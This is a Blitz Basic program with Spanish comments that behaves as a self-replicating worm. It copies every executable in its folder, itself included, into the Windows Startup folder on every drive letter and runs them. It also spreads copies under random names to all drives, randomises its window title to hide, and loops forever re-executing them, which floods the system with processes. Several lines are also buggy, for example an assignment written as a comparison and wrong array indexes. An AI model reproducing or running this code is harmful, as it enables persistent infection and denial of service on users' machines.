;Utilizo SeedRnd y Millisecs() para intentar obtener valores aleatorios
;con el comando rand() y rnd()
SeedRnd MilliSecs()
;genero un valor aleatorio para añadirlo a la barra de "titulo" del programa.
tit#=Rand(0,999999999999)
;convierto el valor a string
num$=Str tit#
;cambio el nombre de la barra de titulo
AppTitle num$
;genera una lista de unidades excluyendo las unidades A:\ y B:\ reservadas para disqueteras.
;inicialmente, creamos las matrices que usaremos en el programa
;para evitar errores de compilacion.
Dim exe_list$(0,0)
Dim exe_list_0_b$(0,0)
Dim unit$(24)
unit$(0)="ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
unit$(1)="C:\"
unit$(2)="D:\"
unit$(3)="E:\"
unit$(4)="F:\"
unit$(5)="G:\"
unit$(6)="H:\"
unit$(7)="I:\"
unit$(8)="J:\"
unit$(9)="K:\"
unit$(10)="L:\"
unit$(11)="M:\"
unit$(12)="N:\"
unit$(13)="O:\"
unit$(14)="P:\"
unit$(15)="Q:\"
unit$(16)="R:\"
unit$(17)="S:\"
unit$(18)="T:\"
unit$(19)="U:\"
unit$(20)="V:\"
unit$(21)="W:\"
unit$(22)="X:\"
unit$(23)="Y:\"
unit$(24)="Z:\"
;comprueba el directorio actual
dir_actual$=CurrentDir()
;comprobacion de archios del directorio actual.
dir_act=ReadDir(dir_actual$)
.chk_file
file_act$=NextFile$(dir_act)
If file_act$=""
	;si no se encuentran mas archivos, salta a la seccion de copiar archivos
	;a la carpeta para ejecutar programas al iniciar windows.
	;como nota, se reducira en uno el valor de la variable "cant_exe#" para
	;evitar acceder a posiciones no validas de las matrices que se han creado
	cant_exe#=cant_exe#-1
	Goto ejecucion
EndIf
;usa la variable extens$ para comprobar toda (o parte) de la extension del archivo
extens$=Right$(file_act$,4)
If extens$=".exe"
	;si la extension del archivo es .exe guarda la ruta del archivo en una matriz
	;para fijar el tamaño de la matriz, se utilizara la variable cant_exe#; Se
	;le asignara el valor 0 en caso de que no se haya creado, y, despues de
	;crearla y/o añadirle nuevos archivos, su valor se incrementara en 1.
	;Obviamente, se le restara 1 a su valor cuando se necesite acceder a todos los
	;datos de la matriz. 
	If cant_exe#=0
		;si no se ha creado la matriz, se crea antes de añadirle la ruta del archivo.
		Dim exe_list$(0,2)
		exe_list$(0,0)=dir_actual$=dir_actual$+file_act$
		exe_list$(0,1)=file_act$
		cant_exe#=cant_exe#+1
	EndIf
	If cant_exe#>0
		;si ya existe, y, dado que al volver a crear una matriz se borran los datos de esta,
		;se crea una segunda matriz para volcar la informacion.
		cant_exe#=cant_exe#-1
		Dim exe_list_0_b$(cant_exe#,1)
		For count#=0 To cant_exe#
			For con_2#=0 To 1
				exe_list_0_b$(count#,con_2#)=exe_list$(count#,con_2#)
			Next
		Next
		cant_exe#=cant_exe#+1
		Dim exe_list$(cant_exe#,2)
		cant_exe#=cant_exe#-1
		;Con la 1a matriz redimensionada, se vuelve a copiar la informacion en esta.
		For count#=0 To cant_exe#
			For con_2#=0 To 1
				exe_list$(count#,con_2#)=exe_list_0_b$(count#,con_2#)
			Next
		Next
		cant_exe#=cant_exe#+1
	EndIf
EndIf
Goto chk_file
.ejecucion
;en esta parte, se utilizara la lista de unidades (posicion 1 a 24 de la matriz unit$())
;mas la ruta indicada en la posicion "0" para localizar el directorio %StartUp%
For count#=1 To 24
	dir_destino$=unit$(count#)+unit$(0)
	If FileType(dir_destino$)=2
		;si se ha encontrado y es el directorio actual del programa, se pasara
		;a la ultima parte del programa.
		;como nota, utilizaremos el comando goto para saltar a la etiqueta autoruning
		If dir_actual$=dir_destino$
			Goto autoruning
		EndIf
		;si se ha encontrado se pasara a copiar los .exe a este directorio
		;y se usa la variable "system_pos#" para marcar la posicion de la
		;matriz que hemos usado para copiar los archivos.
		system_pos#=count#
		For count_2#=0 To cant_exe#
			exe_list$(count_2#,2)=dir_destino$+exe_list$(count_2#,1)
			;antes de copiar el archivo, hacemos una comprobacion
			;para ver si ya existe.
			;en caso de que exista, hacemos un pequeño salto en el
			;programa para evitar copiarlo y evitar posibles errores.
			If FileType(exe_list$(count_2#,2))=1
				Goto evitar_copia_00
			EndIf
			CopyFile exe_list$(count_2#,0),exe_list$(count_2#,2)
			.evitar_copia_00
			;por otra parte, con la siguiente linea se ejecutaran los archivos
			;que se han copiado (entre ellos, este programa):
			ExecFile(exe_list$(count_2#,2))
		Next
	EndIf
Next
.autoruning
;vuelvo a generar un valor aleatorio para añadirlo a la barra de "titulo" del programa.
tit#=Rand(0,999999999999)
;vuelvo a conviertir el valor a string
num$=Str tit#
;vuevlo a cambiar el nombre de la barra de titulo
AppTitle num$
;independientemente de si se han ejecutado o no los archivos que hemos copiado,
;se intentaran dos cosas para, digamos, "forzar" un reinicio y hacer que
;los archivos se ejecuten al arrancar SO.
;lo primero que se intentara es ejecutar los programas que se han encontrado
;en la carpeta de este programa:
For tr#=0 To cant_exe#
	ExecFile(exe_list$(tr#,0))
Next
;la segunda opcion es intentar copiar este programa a otras
;unidades disponibles en el equipo de la siguiente forma:
;utilizamos un bucle for para intentar acceder a la lista
;de unidades
For tr#=0 To 24
	;comprobamos con filetype si esta disponible la unidad.
	;en caso de no estar disponible la unidad de almacenamiento
	;indicada en unit$(tr#), se usara goto para saltar a la
	;etiqueta "sig_unit" y pasar a la siguiente unidad
	;indicada en la matriz.
	If FileType(unit$(tr#))=0
		Goto sig_unit
	EndIf
	;se utiliza otro bucle for y la variable unidad_final
	;para indicar la ruta de destino de cada ejecutable.
	For trr#=0 To cant_exe#
		;como paso adicional, se intentara utilizar numeros
		;para generar un nombre al azar en cada pasada para,
		;digamos, initentar evitar nombres de archivo repetidos.
		;No obstante, se aprovechara el codigo que he hecho para cambiar
		;el nombre de la barra de titulo del programa para generar
		;el nombre de archivo.
		;genero un valor aleatorio para añadirlo a la barra de "titulo" del programa.
		tit#=Rand(0,999999999999)
		;convierto el valor a string
		num$=Str tit#
		;cambio el nombre de la barra de titulo
		AppTitle num$
		unidad_final$=unit$(tr#)+num$
		;antes de copiar el archivo, hacemos una comprobacion
		;con filetype() para evitar cpoiar un archivo con el mismo nombre.
		;Si se da el caso y existe un archivo con el mismo nombre,
		;lo ejecutamos y utilizamos el comando goto para saltar a la 
		;etiqueta "evitar_copia_01" y pasar al siguiente archivo.
		If FileType(unidad_final$)=1
			ExecFile(exe_list$(tr#,0))
			Goto evitar_copia_01
		EndIf
		;en caso de que no exista un archivo con el nuevo nombre
		;se copiara y ejecutara el archivo:
		CopyFile exe_list$(0,1),unidad_final$
		ExecFile(exe_list$(tr#,0))
		.evitar_copia_01
	Next
	.sig_unit
Next
;por ultimo, se volovera a utilizar el comando goto para
;mantener este proceso indefinidamente saltando a la
;etiqueta "autoruning"
Goto autoruning